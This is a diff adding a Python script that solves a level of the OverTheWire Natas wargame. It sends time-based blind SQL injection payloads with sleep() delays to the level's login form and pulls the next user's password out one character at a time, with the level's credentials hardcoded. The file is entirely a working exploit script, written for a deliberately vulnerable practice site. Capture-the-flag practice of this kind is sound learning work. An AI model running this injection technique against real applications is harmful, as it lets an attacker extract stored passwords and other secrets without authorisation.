@@ -1,0 +1,26 @@
+import requests
+import string
+from requests.auth import HTTPBasicAuth
+
+basicAuth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+url = "http://natas17.natas.labs.overthewire.org/index.php"
+
+password = ""  # start with blank password
+count = 1
+PASSWORD_LENGTH = 32
+VALID_CHARS = string.digits + string.ascii_letters
+
+while count <= PASSWORD_LENGTH:
+    for c in VALID_CHARS:
+        payload = "natas18\" AND IF(BINARY substring(password,1,{})='{}', sleep(2), 0) -- ".format(count, password + c)
+        data = {'username': payload}
+
+        response = requests.post(url, data=data, auth=basicAuth)
+
+        if response.elapsed.total_seconds() > 2:
+            password += c
+            print("Found one more char: {}".format(password))
+            count += 1
+            break
+
+print("Done! Password:", password)
